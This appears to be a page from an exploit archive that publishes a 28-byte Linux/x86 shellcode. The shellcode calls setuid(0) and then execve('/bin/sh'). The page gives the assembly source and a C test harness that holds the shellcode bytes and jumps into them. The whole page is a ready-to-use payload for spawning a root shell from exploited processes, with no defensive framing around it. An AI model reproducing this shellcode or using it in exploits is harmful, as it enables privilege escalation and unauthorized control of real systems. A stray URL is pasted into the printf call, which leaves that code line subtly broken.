<html><head><title>Linux/x86 - setuid(0) &amp; execve(/bin/sh,0,0) - 28 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
-------------------[ASM]----------------------

global _start
section .text
_start:
;setuid(0)
xor ebx,ebx
lea eax,[ebx+17h]
cdq
int 80h
;execve(&quot;/bin/sh&quot;,0,0)
xor ecx,ecx
push ecx
push 0x68732f6e
push 0x69622f2f
lea eax,[ecx+0Bh]
mov ebx,esp
int 80h

-------------------[/ASM]----------------------

-------------------[C]----------------------

#include &quot;stdio.h&quot;

const char shellcode[]= &quot;\x31\xdb&quot;
            &quot;\x8d\x43\x17&quot;
            &quot;\x99&quot;
            &quot;\xcd\x80&quot;
            &quot;\x31\xc9&quot;
            &quot;\x51&quot;
            &quot;\x68\x6e\x2f\x73\x68&quot;
            &quot;\x68\x2f\x2f\x62\x69&quot;
            &quot;\x8d\x41\x0b&quot;
            &quot;\x89\xe3&quot;
            &quot;\xcd\x80&quot;;

int main()
{
    printf &lt; http://www.opengroup.org/onlinepubs/009695399/functions/printf.html&gt;(&quot;\nSMALLEST SETUID &amp; EXECVE GNU/LINUX x86 STABLE SHELLCODE&quot;
            &quot;WITHOUT NULLS THAT SPAWNS A SHELL&quot;
            &quot;\n\nCoded by Chema Garcia (aka sch3m4)&quot;
            &quot;\n\t + sch3m4@opensec.es&quot;
            &quot;\n\t + http://opensec.es&quot;
            &quot;\n\n[+] Date: 29/11/2008&quot;
            &quot;\n[+] Thanks to: vlan7&quot;
            &quot;\n\n[+] Shellcode Size: %d bytes\n\n&quot;,
            sizeof(shellcode)-1);

    (*(void (*)()) shellcode)();

    return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
